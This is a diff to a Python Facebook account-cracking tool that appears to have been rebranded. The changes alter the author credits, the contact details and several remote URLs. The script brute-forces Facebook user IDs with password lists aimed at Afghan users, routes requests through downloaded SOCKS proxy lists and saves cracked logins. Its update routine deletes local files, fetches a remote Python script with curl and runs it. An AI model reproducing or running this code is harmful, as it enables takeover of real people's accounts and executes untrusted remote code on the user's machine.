@@ -32,9 +32,9 @@ try:
 except ModuleNotFoundError:
     os.system('pip install mechanize requests futures==2 > /dev/null')
     os.system('python run.py')
-print('\n\033[1;32m[•]   JOIN MY FACEBOOK CHANNEL');time.sleep(1)
-os.system('xdg-open https://www.facebook.com/memelerini.emerim.xd')
-print('\n\033[1;36m[•]   WELCOME TO BATUHAN KAYA TOOL...');time.sleep(3)
+print('\n\033[1;32m[•]   JOIN MY TELEGRAM CHANNEL');time.sleep(1)
+os.system('xdg-open https://t.me/JANRALN')
+print('\n\033[1;36m[•]   WELCOME TO RAYEES ARYAN TOOL...');time.sleep(3)
 fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana','com.facebook.mlite')
 P = '\x1b[1;97m' # PUTIH
 M = '\x1b[1;91m' # MERAH
@@ -57,7 +57,7 @@ my_color = [
  P, M, H, K, B, U, O, N]
 warna = random.choice(my_color)
 try:
-	prox= requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt').text
+	prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('\x1b[1;95m[√] LOADING...')
@@ -67,20 +67,20 @@ prox=open('.prox.txt','r').read().splitlines()
 ugen2=[]
 ugen=[]
 try:
-    prox= requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt').text
     open('proxies.txt','w').write(proxies)
 except Exception as e:
     print('')
 proxies=open('proxies.txt','r').read().splitlines()
 android_models=[]
 try:
-    xx = requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt').text.splitlines()
+    xx = requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/strings.txt').text.splitlines()
     for line in xx:
         android_models.append(line)
 except:pass
 usr=[]
 try:
-    xd=requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt').text.splitlines()
+    xd=requests.get('https://raw.githubusercontent.com/Ramxantanha/data/main/ua.txt').text.splitlines()
     for us in xd:
         usr.append(us)
 except: pass
@@ -151,7 +151,7 @@ for xd in range(10000):
 	ugen.append(uaku2)
 	
 try:
-    prox= requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt').text
+    prox= requests.get('https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt').text
     open('socks5.txt','w').write(prox)
 except Exception as e:
     print('[•] Checking Server...')
@@ -159,15 +159,15 @@ except Exception as e:
 prox=open('socks5.txt','r').read().splitlines()    
 
 logo=("""                  
-\x1b[1;92m
+\\x1b[1;92m
 \x1b[1;92m✮✮▬▬▬◙▬▬▬✮✮✮ ═
 \x1b[1;92m▂▄▆█▆▄▂≛✮🇹🇷🇹🇷✮ ◢◤🅜🅡█▄▄▄▄◢◤ 
 \x1b[1;92m█▄█▂███▀▀▀▀▀▀ ◥█████◤✯🅑🅐🅣🅤✯ ═╩══╩═══ 
 \x1b[1;92m╬🅟🅗🅞🅣🅞🅖🅡🅐🅕🅨╬                                         
-\x1b[1;97m-----------------------------------------------------
+\x1b[1;97m-----------------------------------------------------                                        
 \x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mAUTHOR   \x1b[1;95m: \x1b[1;94mBATU HACK
 \x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mFACEBOOK \x1b[1;95m: \x1b[1;94BATUHAN KAYA
-\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mWHATSAPP \x1b[1;95m: \x1b[1;94m+905527121151      
+\x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mWHATSAPP \x1b[1;95m: \x1b[1;94m+93730448475      
 \x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mTelegram \x1b[1;95m: \x1b[1;94mnafas HACK
 \x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mGITHUB   \x1b[1;95m: \x1b[1;94not have
 \x1b[1;97m[\x1b[1;95m•\x1b[1;97m] \x1b[1;94mVERSION  \x1b[1;95m:\x1b[1;92m 0.𝟓        
@@ -181,13 +181,13 @@ oks = []
 cps = []
 try:
     
-    proxy = requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt).text.splitlines()
+    proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
     v = 3.1
-    update = requests.get('https://github.com/Batu511/BKY-N51/blob/Batu511/Batu.txt').text
+    update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
     if str(v) in update:
         os.system('rm -rf a*')
-        os.system('curl -L https://github.com/Batu511/BKY-N51/blob/Batu511/ZEUS.py')
-        os.system('python ZEUS.py')
+        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
+        os.system('python ali.py')
     else:pass
 except:print('\n\033[1;31mNO INTERNET CONNECTION... \033[0;97m')
 def dynamic(text):
@@ -280,7 +280,7 @@ def m1():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000','100200','200300','300500']
+            pwx=[guru+guru,'۱۲۳۴۵۶','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','Afghan123','10002000','700800','Afghan12345','50006000']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -316,7 +316,7 @@ def m2():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶','100200','200300','300500']
+            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶۷۸۹','kabul123','۱۲۳۴۵۶']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
@@ -352,7 +352,7 @@ def m3():
         lines()
         for guru in user:
             uid = kode+guru
-            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123','۱۰۰۲۰۰','100200','200300','300500']
+            pwx=[guru,'Afghan123','Afghanistan','۱۲۳۴۵۶','kabul123','۱۰۰۲۰۰']
             yaari.submit(rcrack,uid,pwx,tl)
     print(46*'-')
     print('IDZ SAVED IN OK.txt : CP.txt')
